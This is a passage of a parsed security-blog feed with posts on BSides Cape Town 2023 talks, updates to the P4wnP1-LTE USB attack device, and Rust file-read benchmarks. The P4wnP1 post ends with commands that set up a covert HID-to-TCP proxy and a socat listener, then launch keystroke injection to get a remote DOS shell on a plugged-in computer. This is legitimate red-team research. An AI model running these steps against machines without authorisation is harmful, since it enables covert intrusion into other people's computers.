href=\"https://www.youtube.com/watch?v=TfyYNa3JthY\">View on YouTube</a>.</p>\n\n\n\n<p>Following that, <a href=\"https://twitter.com/leonjza\">@leonjza</a> will present a talk titled &#x201C;<a href=\"https://pretalx.com/bsides-cape-town-2023/talk/RYUHJK/\">Attacking Microsoft Exchange: Fusing LightNeuron with Cobalt Strike</a>&#x201D; where he will reflect on a Russian threat actor known as Turla. Leon will dive into the details and a reimagination of an Exchange backdoor that Turla used, called LightNeuron while fusing it with Cobalt Strike to interact with a beacon over email. <a href=\"https://www.youtube.com/watch?v=l-jEzRH-ktE\">View on YouTube</a>.</p>\n\n\n\n<p>Next, <a href=\"https://twitter.com/shifttymike\">@shifttymike</a> will present &#x201C;<a href=\"https://pretalx.com/bsides-cape-town-2023/talk/8398BU/\">Noooooooooo touch!</a>&#x201D; where he will walk through the journey of researching &#x201C;no touch&#x201D; sensors commonly used to allow people to exit buildings by opening doors after moving your hand past one of these sensors. Michael will demonstrate how he bypassed these sensors allowing him to open doors (for example) from the wrong side of a door, and at a significantly larger distance. He may even have a nifty little portable version of the gear required for this&#x2026; <a href=\"https://www.youtube.com/watch?v=g8V6AG4Bsew\">View on YouTube</a>.</p>\n\n\n\n<p>Finally, <a href=\"https://twitter.com/singe\">@singe</a> will deliver a talk titled &#x201C;<a href=\"https://pretalx.com/bsides-cape-town-2023/talk/9LVMTQ/\">Performance Hacking &#x2013; how to hack your tools to go faster</a>&#x201D; where he will dive into performance details of building an efficient password cracking tool, how to perform performance analysis and more, to ultimately get a tool that works faster using computer science and not just more hardware. <a href=\"https://www.youtube.com/watch?v=zWIqBKod2AY\">View on YouTube</a>.</p>\n\n\n\n<h2 class=\"wp-block-heading\">challenge &#x2013; vending machine</h2>\n\n\n\n<figure class=\"wp-block-image size-large\"><a href=\"https://sensepost.com/img/pages/blog/2023/were-going-to-bsides-cape-town-2023/IMG_8870-scaled.jpeg\"><img loading=\"lazy\" decoding=\"async\" width=\"576\" height=\"1024\" src=\"https://sensepost.com/img/pages/blog/2023/were-going-to-bsides-cape-town-2023/IMG_8870-576x1024.jpeg\" alt=\"\" class=\"wp-image-71350\"></a></figure>\n\n\n\n<p>Last year, together with <a href=\"https://twitter.com/elasticninja\">@elasticninja</a> we tried to have a vending machine challenge up and running for conference participants to hack at with a bunch of prizes up for grabs. It was a lot of fun (even though a lot of stuff went wrong), and learning from those lessons, we&#x2019;re back  with the vending machine this year, with new and improved hardware, challenges and more. Be sure to come and visit the machine to learn how to hack it to win some prizes!</p>\n\n\n\n<h2 class=\"wp-block-heading\">volunteers</h2>\n\n\n\n<p>Not everything is obviously visible like talks and challenges. In fact, some of the hardest work goes into organising the event. We&#x2019;re proud to have <a href=\"https://twitter.com/IPMegladon\">Isak</a>, <a href=\"https://twitter.com/GeoffChisnall\">Geoffrey</a> and Roberto from the SensePost team form part of the organising team helping make BSides Cape Town what it is!</p>\n",
      "content:encodedSnippet": "Arguably one of the largest hacking conferences in South Africa, BSides Cape Town 2023 is around the corner and the SensePost Team is there with a jam packed agenda demonstrating our latest research (with five talks), challenges and more! In this post, I’ll summarise what you can expect. For timing related information, check out the schedule here. Be sure to come and say hi at our stand in the chill area too.\n\n\n\n\ntalks\nOpening BSides Cape Town 2023 is @singe with a Keynote “Impose Cost: Our defences eventually fail and we need to take the fight to the criminals” where he will argue that the only way to effectively and realistically succeed in defending our networks is to take the challenge to the real criminals and not just wait for them to come. View on YouTube.\nNext we have Reino Mostert in a talk “LPE in enterprise software” demonstrating a Local Privilege Escalation vulnerability he found which was made possible by extending James Forshaw‘s directory junction work, but chaining them to effectively bypass a mitigation the vendor implemented. View on YouTube.\nFollowing that, @leonjza will present a talk titled “Attacking Microsoft Exchange: Fusing LightNeuron with Cobalt Strike” where he will reflect on a Russian threat actor known as Turla. Leon will dive into the details and a reimagination of an Exchange backdoor that Turla used, called LightNeuron while fusing it with Cobalt Strike to interact with a beacon over email. View on YouTube.\nNext, @shifttymike will present “Noooooooooo touch!” where he will walk through the journey of researching “no touch” sensors commonly used to allow people to exit buildings by opening doors after moving your hand past one of these sensors. Michael will demonstrate how he bypassed these sensors allowing him to open doors (for example) from the wrong side of a door, and at a significantly larger distance. He may even have a nifty little portable version of the gear required for this… View on YouTube.\nFinally, @singe will deliver a talk titled “Performance Hacking – how to hack your tools to go faster” where he will dive into performance details of building an efficient password cracking tool, how to perform performance analysis and more, to ultimately get a tool that works faster using computer science and not just more hardware. View on YouTube.\nchallenge – vending machine\n\n\n\n\nLast year, together with @elasticninja we tried to have a vending machine challenge up and running for conference participants to hack at with a bunch of prizes up for grabs. It was a lot of fun (even though a lot of stuff went wrong), and learning from those lessons, we’re back  with the vending machine this year, with new and improved hardware, challenges and more. Be sure to come and visit the machine to learn how to hack it to win some prizes!\nvolunteers\nNot everything is obviously visible like talks and challenges. In fact, some of the hardest work goes into organising the event. We’re proud to have Isak, Geoffrey and Roberto from the SensePost team form part of the organising team helping make BSides Cape Town what it is!",
      "content": "Arguably one of the largest hacking conferences in South Africa, BSides Cape Town 2023 is around the corner and the SensePost Team is there with a jam packed agenda demonstrating our latest research (with five talks), challenges and more! In this post, I&amp;#x2019;ll summarise what you can expect. For timing related information, check out the schedule here. Be sure to come and say hi at our stand in the chill area too.\n\n",
      "contentSnippet": "Arguably one of the largest hacking conferences in South Africa, BSides Cape Town 2023 is around the corner and the SensePost Team is there with a jam packed agenda demonstrating our latest research (with five talks), challenges and more! In this post, I&#x2019;ll summarise what you can expect. For timing related information, check out the schedule here. Be sure to come and say hi at our stand in the chill area too.",
      "guid": "https://sensepost.com/blog/2023/were-going-to-bsides-cape-town-2023/",
      "isoDate": "2023-11-28T07:17:03.000Z",
      "itunes": {}
    },
    {
      "title": "P4wnP1 LTE updates",
      "link": "https://sensepost.com/blog/2023/p4wnp1-lte-updates/",
      "pubDate": "Fri, 27 Oct 2023 15:12:27 +0000",
      "content:encoded": "<p>After publishing my blog post about <a href=\"https://sensepost.com/blog/2023/p4wnp1-lte/\" data-type=\"link\" data-id=\"https://blog.sensepost.com/wp-admin/post.php?post=67765&amp;action=edit\">running P4wnP1 on an LTE modem</a>, where I explained how to install Linux and P4wnP1 on an actual LTE modem for sneaky USB attacks, and then trying and failing to do an internal presentation to show it off to folks, I realised that I had not completely documented the process. In fact, I had left it rather <strong>incomplete</strong> as it turned out! As I was intending to give a public demonstration of P4wnP1-LTE, I had some work to do.</p>\n\n\n\n<h2 class=\"wp-block-heading\">Unusable LTE</h2>\n\n\n\n<p>Firstly, I was unable to get the LTE interface to connect reliably, and pass packets. Having revisited it since that embarrassing internal presentation failure, I now suspect that the problem was strongly linked to the temperature of the LTE modem. To address this, I made use of the commands mentioned at the end of the previous post (<code>chcpu -d 1,2,3</code>) to disable 3 of the 4 cores. This was able to stop the temperatures rising above around 65C, and since doing so, I have had no issues maintaining the LTE connection. <code>cat /sys/class/thermal/*/temp</code> will output the temperatures of the various sensors that the kernel knows about, if you want to check easily.</p>\n\n\n\n<p>Which is not to say that I have had no issues connecting over LTE (using a Vodacom SIM)! In the previous post, I also described setting up a Wireguard VPN to an Internet-accessible host, and then using SSH to access the modem over that VPN. I started noticing that trying to monitor the P4wnP1 logs, or grepping the P4wnP1 code base for certain strings would also result in my SSH connection dying instantly. However, I could immediately reconnect using SSH, so the modem was staying up, and the LTE connection and Wireguard VPN were all &#x201C;healthy&#x201D;. Furthermore, when the WiFi link was up, and Wireguard was routing over WiFi, I had no problems running the same commands. What could possibly be the problem?</p>\n\n\n\n<p>I started writing a description of the problem in our internal chat to try and solicit debugging suggestions, and while doing so, it struck me that the SSH connection was fine with small amounts of data. I could connect via SSH, authenticate, navigate around the file system, etc. It was not time based, as whether I ran the grep immediately, or after other commands, the lockup behaviour was identical. Large amounts of terminal output would reliably lock up the SSH connection in exactly the same way, every time.</p>\n\n\n\n<p>This didn&#x2019;t seem to be a problem with downloading files over the LTE connection. I could <code>apt update &amp;&amp; apt install</code> with no problems. I recalled a conversation that I had seen a few weeks prior in Discord, where someone described a connection hanging due to an incorrect MTU.</p>\n\n\n\n<p>What is MTU, though? According to <a href=\"https://en.wikipedia.org/wiki/Maximum_transmission_unit\" data-type=\"link\" data-id=\"https://en.wikipedia.org/wiki/Maximum_transmission_unit\">Wikipedia</a>, the maximum transmission unit (MTU) is the size of the largest protocol data unit (PDU) that can be communicated in a single network layer transaction. You can figure out the MTU for a particular interface using ping.</p>\n\n\n\n<pre class=\"wp-block-code\"><code>ping 8.8.8.8 -c 2 -M do -s 1392</code></pre>\n\n\n\n<p>This sends two ICMP packets to 8.8.8.8, with a data size of 1392 octets (<code>-s 1392</code>), and sets the Path MTU Discovery strategy to prohibit fragmentation (<code>-M do</code>). Basically, this tells any routers not to break up any packets that are too large for the next hop, but rather to return an ICMP error. This allows you to know what the MTU of a particular network path is.</p>\n\n\n\n<p>I used this with an ever decreasing packet size to try and figure out what the MTU of my LTE interface was. It was defaulted to something like 1500, but to my surprise, I got all the way down to an ICMP data size of 996 before I was able to successfully get an ICMP response back. Due to ICMP packet framing overhead, you need to add 8 bytes of ICMP and 20 bytes of IPv4 to the data size to calculate the actual MTU. After setting the LTE MTU to 1024, I was able to successfully establish the Wireguard VPN, and SSH connection over LTE, and execute all the commands that were failing previously.</p>\n\n\n\n<p>A possible alternative approach is to run <code>tcpdump</code> while downloading something large from the Internet, and seeing what size packets are sent from upstream. One presumes that the Mobile Provider also knows what MTU the link should have, and will only send packets of that maximum size. This is because the MTU is only effective in a single direction, for packets SENT from the system, and doesn&#x2019;t affect the size of packets received.</p>\n\n\n\n<p>A surprising detail though, is that while you normally have to have layered interfaces use a smaller MTU than the underlying interface MTU, in order to account for VPN framing, this does not seem to be the case for Wireguard. Wireguard works just fine over LTE with an MTU of 1420. I&#x2019;m honestly not sure why or how this works. Maybe Wireguard just fragments the packets anyway?</p>\n\n\n\n<p>The lesson for me there was that taking the time to frame the symptoms I was seeing in a way that someone else could make sense of helped me to solve the problem on my own. The classic Rubber Duck debugging technique strikes again.</p>\n\n\n\n<h2 class=\"wp-block-heading\">Rebuilding P4wnP1</h2>\n\n\n\n<p>So with the network interfaces now reliable, was I ready for a public presentation? Unfortunately not! It turns out that P4wnP1 has some unmet expectations with regards to the kernel modules that should be available, that I had overlooked in the previous blog post. It was looking for <code>libcomposite</code> in <code>lsmod</code> output, and trying to <code>modprobe libcomposite</code> if it was not found. This works fine on the Raspberry Pi, but fails on the OpenStick distribution, because libcomposite is built in, and not a module. I discovered this by running <code>rmmod libcomposite</code>, and saw that information in the resulting error message. I&#x2019;m honestly not sure if there is a better way of knowing what is built in, and what modules are available, other than looking for the kernel .config file. </p>\n\n\n\n<p>Knowing that P4wnP1 is very old code, and that I had trouble trying to build it in the past, on top of having near zero Golang experience, I contemplated papering over it by making shims for lsmod that would return the expected output even if libcomposite was a builtin and not a module. But I decided to bite the bullet, and at least try to build the codebase with my changes.</p>\n\n\n\n<p>The P4wnP1 code base has a Makefile in the root, so I started there, and tried to <code>make compile</code>. To my dismay, this ended up downloading so many go dependencies, and complaining about things like deprecation, and being unable to find dependencies, even though going to the URL it printed out showed that the dependency was there. Fortunately, Leon, our resident Golang enthusiast, was able to explain that I probably didn&#x2019;t want the <code>-u</code> option that Mame82 had included when invoking <code>go get</code>. This tells go to update dependencies to newer minor or patch releases. Skipping the updates had everything compile with almost no problems, other than needing to change <code>go get</code> gopherjs to <code>go install</code> gopherjs due to syntax changes.</p>\n\n\n\n<p>With the Makefile updated, and commenting out a bunch of entries designed to install Debian/Kali packages, and made Kali configuration changes for P4wnP1_ALOA, I had P4wnP1 compiled. Except it was compiled for the 64-bit AArch64 Ubuntu installation I was using as a build server, rather than the armv6 architecture needed for the Raspberry Pi (that also runs successfully on the NanoPi R1S and the OpenStick!). Grepping the source for GOARCH, I found a build script at <code>./build_support/build.sh</code> that did the necessary. After a few iterations trying to figure out why my changes didn&#x2019;t solve the problem, I realised that the output of <code>rmmod libcomposite</code> was on stderr, not stdout, and corrected my code. Success!</p>\n\n\n\n<h2 class=\"wp-block-heading\">P4wnP1 wants to control the WiFi</h2>\n\n\n\n<p>With all of that done, I still faced the problem that P4wnP1 wanted to take over control of the wireless interface from NetworkManager, and implemented the wireless configuration in the same way that it did (successfully) on the Raspberry Pi Zero. I had worked around this on the NanoPi R1S by renaming the real wifi interface to something other than wlan0, and creating a dummy wlan0 with the mac80211_hwsim module. Unfortunately, mac80211_hwsim is not currently compiled for the OpenStick, so I can&#x2019;t do this. Granted, this is more of an issue for the NanoPi, because the WiFi interface is the only way to access the hardware. For the OpenStick, the LTE interface is available. My solution was to instruct NetworkManager not to try and manage the WiFi interface when P4wnP1 is running, using a systemd service configuration option:</p>\n\n\n\n<pre class=\"wp-block-code\"><code>ExecStartPre=/usr/bin/nmcli device set wlan0 managed no\nExecStart=/usr/local/bin/P4wnP1_service\nExecStopPost=/usr/bin/nmcli device set wlan0 managed yes</code></pre>\n\n\n\n<p>This tells systemd to run the listed commands before starting and after stopping P4wnP1 respectively, resulting in NetworkManager ignoring the wlan0 interface while P4wnP1 is running. Ideally P4wnP1 should be updated to have an option to ignore the WiFi interface completely, and let the OS manage it instead, as opposed to the current &#x201C;disable it or manage it&#x201D; option.</p>\n\n\n\n<h2 class=\"wp-block-heading\">Shell over Raw HID</h2>\n\n\n\n<p>The last thing to test was the Raw HID channel. I ran the following commands to download my HID to TCP proxy, install golang on the OpenStick, and build and run it:</p>\n\n\n\n<pre class=\"wp-block-code\"><code>git clone <a rel=\"noreferrer noopener\" href=\"https://github.com/RoganDawes/CovertChannel\" target=\"_blank\">https://github.com/RoganDawes/CovertChannel</a><br>cd CovertChannel<br>cp Client/PowerShell/helper.js /usr/local/P4wnP1/HIDScripts/covertchannel.js<br>apt install -y golang socat<br>cd Server/Go<br>go run server.go</code></pre>\n\n\n\n<p>You could also cross compile it and copy it across if you prefer, using the same GOARCH, etc flags from building P4wnP1 in the previous section.</p>\n\n\n\n<p>With the CovertChannel server running, I could open another terminal and run <code>socat TCP-L:4444,fork,reuseaddr -</code> to wait for my shell, then go to the P4wnP1 web interface to launch the keystroke injection. Selecting the HIDScript tab, and the &#x201C;Load and Replace&#x201D; button, I selected the &#x201C;covertchannel.js&#x201D; file that I had just copied. It&#x2019;s important to include the correct USB VID and PID in the script, so that the PowerShell running on the client knows which device to connect to. Check that they are the same between the HID tab and the last couple of lines of the covertchannel.js script. Then hit Run, and wait for the magic! After a few moments, you should see a lot of activity in the go server terminal, and a DOS Shell prompt appear in your socat terminal. If it doesn&#x2019;t show up after about 10-15 seconds, try press Enter a couple of times. Enjoy!</p>\n\n\n\n<p>If anyone with Golang skills wants to try and update P4wnP1 to integrate the CovertChannel proxy, and bring the dependencies into the mid twenties, that would be awesome. Integrating the terminal (socat) into P4wnP1 using something like <a href=\"https://github.com/chjj/term.js\">term.js</a> would also be cool, but perhaps quite a lot more work. I do have the start of that work for anyone who wants to to continue, though. Get in touch if this sounds like fun!</p>\n",
      "content:encodedSnippet": "After publishing my blog post about running P4wnP1 on an LTE modem, where I explained how to install Linux and P4wnP1 on an actual LTE modem for sneaky USB attacks, and then trying and failing to do an internal presentation to show it off to folks, I realised that I had not completely documented the process. In fact, I had left it rather incomplete as it turned out! As I was intending to give a public demonstration of P4wnP1-LTE, I had some work to do.\nUnusable LTE\nFirstly, I was unable to get the LTE interface to connect reliably, and pass packets. Having revisited it since that embarrassing internal presentation failure, I now suspect that the problem was strongly linked to the temperature of the LTE modem. To address this, I made use of the commands mentioned at the end of the previous post (chcpu -d 1,2,3) to disable 3 of the 4 cores. This was able to stop the temperatures rising above around 65C, and since doing so, I have had no issues maintaining the LTE connection. cat /sys/class/thermal/*/temp will output the temperatures of the various sensors that the kernel knows about, if you want to check easily.\nWhich is not to say that I have had no issues connecting over LTE (using a Vodacom SIM)! In the previous post, I also described setting up a Wireguard VPN to an Internet-accessible host, and then using SSH to access the modem over that VPN. I started noticing that trying to monitor the P4wnP1 logs, or grepping the P4wnP1 code base for certain strings would also result in my SSH connection dying instantly. However, I could immediately reconnect using SSH, so the modem was staying up, and the LTE connection and Wireguard VPN were all “healthy”. Furthermore, when the WiFi link was up, and Wireguard was routing over WiFi, I had no problems running the same commands. What could possibly be the problem?\nI started writing a description of the problem in our internal chat to try and solicit debugging suggestions, and while doing so, it struck me that the SSH connection was fine with small amounts of data. I could connect via SSH, authenticate, navigate around the file system, etc. It was not time based, as whether I ran the grep immediately, or after other commands, the lockup behaviour was identical. Large amounts of terminal output would reliably lock up the SSH connection in exactly the same way, every time.\nThis didn’t seem to be a problem with downloading files over the LTE connection. I could apt update && apt install with no problems. I recalled a conversation that I had seen a few weeks prior in Discord, where someone described a connection hanging due to an incorrect MTU.\nWhat is MTU, though? According to Wikipedia, the maximum transmission unit (MTU) is the size of the largest protocol data unit (PDU) that can be communicated in a single network layer transaction. You can figure out the MTU for a particular interface using ping.\nping 8.8.8.8 -c 2 -M do -s 1392\nThis sends two ICMP packets to 8.8.8.8, with a data size of 1392 octets (-s 1392), and sets the Path MTU Discovery strategy to prohibit fragmentation (-M do). Basically, this tells any routers not to break up any packets that are too large for the next hop, but rather to return an ICMP error. This allows you to know what the MTU of a particular network path is.\nI used this with an ever decreasing packet size to try and figure out what the MTU of my LTE interface was. It was defaulted to something like 1500, but to my surprise, I got all the way down to an ICMP data size of 996 before I was able to successfully get an ICMP response back. Due to ICMP packet framing overhead, you need to add 8 bytes of ICMP and 20 bytes of IPv4 to the data size to calculate the actual MTU. After setting the LTE MTU to 1024, I was able to successfully establish the Wireguard VPN, and SSH connection over LTE, and execute all the commands that were failing previously.\nA possible alternative approach is to run tcpdump while downloading something large from the Internet, and seeing what size packets are sent from upstream. One presumes that the Mobile Provider also knows what MTU the link should have, and will only send packets of that maximum size. This is because the MTU is only effective in a single direction, for packets SENT from the system, and doesn’t affect the size of packets received.\nA surprising detail though, is that while you normally have to have layered interfaces use a smaller MTU than the underlying interface MTU, in order to account for VPN framing, this does not seem to be the case for Wireguard. Wireguard works just fine over LTE with an MTU of 1420. I’m honestly not sure why or how this works. Maybe Wireguard just fragments the packets anyway?\nThe lesson for me there was that taking the time to frame the symptoms I was seeing in a way that someone else could make sense of helped me to solve the problem on my own. The classic Rubber Duck debugging technique strikes again.\nRebuilding P4wnP1\nSo with the network interfaces now reliable, was I ready for a public presentation? Unfortunately not! It turns out that P4wnP1 has some unmet expectations with regards to the kernel modules that should be available, that I had overlooked in the previous blog post. It was looking for libcomposite in lsmod output, and trying to modprobe libcomposite if it was not found. This works fine on the Raspberry Pi, but fails on the OpenStick distribution, because libcomposite is built in, and not a module. I discovered this by running rmmod libcomposite, and saw that information in the resulting error message. I’m honestly not sure if there is a better way of knowing what is built in, and what modules are available, other than looking for the kernel .config file. \nKnowing that P4wnP1 is very old code, and that I had trouble trying to build it in the past, on top of having near zero Golang experience, I contemplated papering over it by making shims for lsmod that would return the expected output even if libcomposite was a builtin and not a module. But I decided to bite the bullet, and at least try to build the codebase with my changes.\nThe P4wnP1 code base has a Makefile in the root, so I started there, and tried to make compile. To my dismay, this ended up downloading so many go dependencies, and complaining about things like deprecation, and being unable to find dependencies, even though going to the URL it printed out showed that the dependency was there. Fortunately, Leon, our resident Golang enthusiast, was able to explain that I probably didn’t want the -u option that Mame82 had included when invoking go get. This tells go to update dependencies to newer minor or patch releases. Skipping the updates had everything compile with almost no problems, other than needing to change go get gopherjs to go install gopherjs due to syntax changes.\nWith the Makefile updated, and commenting out a bunch of entries designed to install Debian/Kali packages, and made Kali configuration changes for P4wnP1_ALOA, I had P4wnP1 compiled. Except it was compiled for the 64-bit AArch64 Ubuntu installation I was using as a build server, rather than the armv6 architecture needed for the Raspberry Pi (that also runs successfully on the NanoPi R1S and the OpenStick!). Grepping the source for GOARCH, I found a build script at ./build_support/build.sh that did the necessary. After a few iterations trying to figure out why my changes didn’t solve the problem, I realised that the output of rmmod libcomposite was on stderr, not stdout, and corrected my code. Success!\nP4wnP1 wants to control the WiFi\nWith all of that done, I still faced the problem that P4wnP1 wanted to take over control of the wireless interface from NetworkManager, and implemented the wireless configuration in the same way that it did (successfully) on the Raspberry Pi Zero. I had worked around this on the NanoPi R1S by renaming the real wifi interface to something other than wlan0, and creating a dummy wlan0 with the mac80211_hwsim module. Unfortunately, mac80211_hwsim is not currently compiled for the OpenStick, so I can’t do this. Granted, this is more of an issue for the NanoPi, because the WiFi interface is the only way to access the hardware. For the OpenStick, the LTE interface is available. My solution was to instruct NetworkManager not to try and manage the WiFi interface when P4wnP1 is running, using a systemd service configuration option:\nExecStartPre=/usr/bin/nmcli device set wlan0 managed no\nExecStart=/usr/local/bin/P4wnP1_service\nExecStopPost=/usr/bin/nmcli device set wlan0 managed yes\nThis tells systemd to run the listed commands before starting and after stopping P4wnP1 respectively, resulting in NetworkManager ignoring the wlan0 interface while P4wnP1 is running. Ideally P4wnP1 should be updated to have an option to ignore the WiFi interface completely, and let the OS manage it instead, as opposed to the current “disable it or manage it” option.\nShell over Raw HID\nThe last thing to test was the Raw HID channel. I ran the following commands to download my HID to TCP proxy, install golang on the OpenStick, and build and run it:\ngit clone https://github.com/RoganDawes/CovertChannel\ncd CovertChannel\ncp Client/PowerShell/helper.js /usr/local/P4wnP1/HIDScripts/covertchannel.js\napt install -y golang socat\ncd Server/Go\ngo run server.go\nYou could also cross compile it and copy it across if you prefer, using the same GOARCH, etc flags from building P4wnP1 in the previous section.\nWith the CovertChannel server running, I could open another terminal and run socat TCP-L:4444,fork,reuseaddr - to wait for my shell, then go to the P4wnP1 web interface to launch the keystroke injection. Selecting the HIDScript tab, and the “Load and Replace” button, I selected the “covertchannel.js” file that I had just copied. It’s important to include the correct USB VID and PID in the script, so that the PowerShell running on the client knows which device to connect to. Check that they are the same between the HID tab and the last couple of lines of the covertchannel.js script. Then hit Run, and wait for the magic! After a few moments, you should see a lot of activity in the go server terminal, and a DOS Shell prompt appear in your socat terminal. If it doesn’t show up after about 10-15 seconds, try press Enter a couple of times. Enjoy!\nIf anyone with Golang skills wants to try and update P4wnP1 to integrate the CovertChannel proxy, and bring the dependencies into the mid twenties, that would be awesome. Integrating the terminal (socat) into P4wnP1 using something like term.js would also be cool, but perhaps quite a lot more work. I do have the start of that work for anyone who wants to to continue, though. Get in touch if this sounds like fun!",
      "content": "After publishing my blog post about running P4wnP1 on an LTE modem, where I explained how to install Linux and P4wnP1 on an actual LTE modem for sneaky USB attacks, and then trying and failing to do an internal presentation to show it off to folks, I realised that I had not completely documented the process. In fact, I had left it rather incomplete as it turned out! As I was intending to give a public demonstration of P4wnP1-LTE, I had some work to do.\n\n",
      "contentSnippet": "After publishing my blog post about running P4wnP1 on an LTE modem, where I explained how to install Linux and P4wnP1 on an actual LTE modem for sneaky USB attacks, and then trying and failing to do an internal presentation to show it off to folks, I realised that I had not completely documented the process. In fact, I had left it rather incomplete as it turned out! As I was intending to give a public demonstration of P4wnP1-LTE, I had some work to do.",
      "guid": "https://sensepost.com/blog/2023/p4wnp1-lte-updates/",
      "isoDate": "2023-10-27T15:12:27.000Z",
      "itunes": {}
    },
    {
      "title": "Reading Large Files and Perf",
      "link": "https://sensepost.com/blog/2023/reading-large-files-and-perf/",
      "pubDate": "Tue, 19 Sep 2023 08:08:18 +0000",
      "content:encoded": "<p>One of the things that has often confused me is how little good advice there is for reading large files efficiently when writing code.</p>\n\n\n\n<p>Typically most people use whatever the canonical file read suggestion for their language is, until they need to read large files and it&#x2019;s too slow. Then they google &#x201C;efficiently reading large files in &lt;lang&gt;&#x201D; and are pointed to a buffered reader of some sort, and that&#x2019;s that.</p>\n\n\n\n<p>However, in <a rel=\"noreferrer noopener\" href=\"https://docs.google.com/presentation/d/1wOT5kOWkQybVTHzB7uLXpU39ctYzXpOs2xVyD4zuYXY/edit#slide=id.g809d36a3fc4b213_99\" target=\"_blank\">Halvar Flake&#x2019;s recent QCon talk</a> he had several slides talking about how most code is written based on the old assumptions of spinning disks. With non-SSD HD&#x2019;s there&#x2019;s usually a single read head and you can&#x2019;t do much in parallel. This requires code to optimise for single reads, minimal seeks, and large readahead of data laid out on disk next to each other. But modern SSDs are much more comfortable with seeks and parallelism.</p>\n\n\n\n<p>So I wanted to test it. To do this I wrote five simple rust programs that read data from a large file. To keep it simple, I didn&#x2019;t do any line reading &#x2013; just read as much as you can as fast as you can.</p>\n\n\n\n<p>The code for each of these is <a href=\"https://github.com/sensepost/file-read-experiments\" target=\"_blank\" rel=\"noreferrer noopener\">available here</a>.</p>\n\n\n\n<h2 class=\"wp-block-heading\">The strategies</h2>\n\n\n\n<p>1 &#x2013; <a href=\"https://github.com/sensepost/file-read-experiments/blob/main/read-vanilla/src/main.rs\" target=\"_blank\" rel=\"noreferrer noopener\">Vanilla</a></p>\n\n\n\n<p>Vanilla is the simplest and based on what you get when you google &#x201C;reading a file in rust&#x201D; which points you to <a href=\"https://doc.rust-lang.org/book/ch12-02-reading-a-file.html\" target=\"_blank\" rel=\"noreferrer noopener\">this chapter</a> in the rust handbook.</p>\n\n\n\n<p>It tries to read the whole file, and convert it into a single String in memory.</p>\n\n\n\n<p>2 &#x2013; <a href=\"https://github.com/sensepost/file-read-experiments/blob/main/read-ioread/src/main.rs\" target=\"_blank\" rel=\"noreferrer noopener\">IO Read</a></p>\n\n\n\n<p>IO read dispenses with the String conversion and does the same as vanilla but with a raw read into a single byte buffer.</p>\n\n\n\n<p>Both (1) and (2) will fail if the file you&#x2019;re trying to read can&#x2019;t fit into memory.</p>\n\n\n\n<p>3 &#x2013; <a href=\"https://github.com/sensepost/file-read-experiments/blob/main/read-chunks/src/main.rs\" target=\"_blank\" rel=\"noreferrer noopener\">Block Read</a></p>\n\n\n\n<p>Block read is a modification of (2) to read the file in 8M blocks instead of trying to read the whole file into memory.</p>\n\n\n\n<p>The 8M block size is based on some simple tests I did on my machine.</p>\n\n\n\n<p>4 &#x2013; <a href=\"https://github.com/sensepost/file-read-experiments/blob/main/read-bufread/src/main.rs\" target=\"_blank\" rel=\"noreferrer noopener\">Buffered Reader</a></p>\n\n\n\n<p>If you google &#x201C;efficiently reading large files in rust&#x201D; you&#x2019;ll likely hit an article pointing you to BufReader. The most common use case is to read lines. Instead this is a slight modification to do block reads instead and keep it consistent with the other approaches.</p>\n\n\n\n<p>5 &#x2013; <a href=\"https://github.com/sensepost/file-read-experiments/blob/main/read-threads/src/main.rs\" target=\"_blank\" rel=\"noreferrer noopener\">Thread Reader</a></p>\n\n\n\n<p>Finally, this is a threaded version of (3) where each thread simultaneously opens its own file handle, seeks to its offset and reads a part of the file.</p>\n\n\n\n<p>This used to be a &#x201C;bad idea&#x201D; &#x2013; multiple concurrent seeks, and concurrent reads would be slow on spinning disks.</p>\n\n\n\n<p>I&#x2019;m using 10 threads, which is as many cores as my MBP M1 has.</p>\n\n\n\n<h2 class=\"wp-block-heading\">Measuring Methodology</h2>\n\n\n\n<p>I&#x2019;m quite simply measuring total execution time of each version when reading a 5G file. I do this using the fantastic <a href=\"https://github.com/sharkdp/hyperfine\" target=\"_blank\" rel=\"noreferrer noopener\">hyperfine</a> tool.</p>\n\n\n\n<p>I run each test three times to warm up caches, then I do five measured runs. The tests were run on my 2021 MBP with an M1 chip.</p>\n\n\n\n<p>Hyperfine gives the mean of the five runs with standard deviation, as well as a min and max. Finally it gives some stats comparing each run.</p>\n\n\n\n<h2 class=\"wp-block-heading\">Results</h2>\n\n\n\n<p>Here are the results of the run. As you can see the vanilla approach is horribly slow. Over 12x slower than the best approach. The IO reader is slightly faster, but not much,&#xA0;because it isn&#x2019;t needing to mess with String allocations/conversions. There&#x2019;s a significant speedup reading blocks, and the buffered reader can do this for you and is even very slightly faster than doing it manually. However, when we switch to concurrent reads, we get a significant speed up &#x2013; nearly 3x faster than the buffered reader.</p>\n\n\n\n<figure class=\"wp-block-image size-large\"><a href=\"https://sensepost.com/img/pages/blog/2023/reading-large-files-and-perf/1.385-s.png\"><img loading=\"lazy\" decoding=\"async\" width=\"1024\" height=\"680\" src=\"https://sensepost.com/img/pages/blog/2023/reading-large-files-and-perf/1.385-s-1024x680.png\" alt=\"\" class=\"wp-image-70190\"></a></figure>\n\n\n\n<h2 class=\"wp-block-heading\">Conclusion</h2>\n\n\n\n<p>In short, Halvar was right, which isn&#x2019;t a very controversial statement. However, I was genuinely surprised to see how big a difference it made, and that there&#x2019;s little to no discussion on the topic. I hope this helps someone somewhere.</p>\n",
      "content:encodedSnippet": "One of the things that has often confused me is how little good advice there is for reading large files efficiently when writing code.\nTypically most people use whatever the canonical file read suggestion for their language is, until they need to read large files and it’s too slow. Then they google “efficiently reading large files in <lang>” and are pointed to a buffered reader of some sort, and that’s that.\nHowever, in Halvar Flake’s recent QCon talk he had several slides talking about how most code is written based on the old assumptions of spinning disks. With non-SSD HD’s there’s usually a single read head and you can’t do much in parallel. This requires code to optimise for single reads, minimal seeks, and large readahead of data laid out on disk next to each other. But modern SSDs are much more comfortable with seeks and parallelism.\nSo I wanted to test it. To do this I wrote five simple rust programs that read data from a large file. To keep it simple, I didn’t do any line reading – just read as much as you can as fast as you can.\nThe code for each of these is available here.\nThe strategies\n1 – Vanilla\nVanilla is the simplest and based on what you get when you google “reading a file in rust” which points you to this chapter in the rust handbook.\nIt tries to read the whole file, and convert it into a single String in memory.\n2 – IO Read\nIO read dispenses with the String conversion and does the same as vanilla but with a raw read into a single byte buffer.\nBoth (1) and (2) will fail if the file you’re trying to read can’t fit into memory.\n3 – Block Read\nBlock read is a modification of (2) to read the file in 8M blocks instead of trying to read the whole file into memory.\nThe 8M block size is based on some simple tests I did on my machine.\n4 – Buffered Reader\nIf you google “efficiently reading large files in rust” you’ll likely hit an article pointing you to BufReader. The most common use case is to read lines. 